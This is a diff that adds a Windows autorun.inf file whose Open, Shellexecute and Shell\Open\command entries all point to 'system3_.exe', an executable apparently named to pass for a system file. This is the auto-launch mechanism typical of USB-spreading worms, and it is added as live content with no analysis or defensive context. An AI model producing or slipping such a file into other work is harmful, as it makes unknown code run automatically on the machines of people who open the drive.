@@ -1,0 +1,5 @@
+[Autorun]
+Open=system3_.exe
+Shellexecute=system3_.exe
+Shell\Open\command=system3_.exe
+Shell=Open
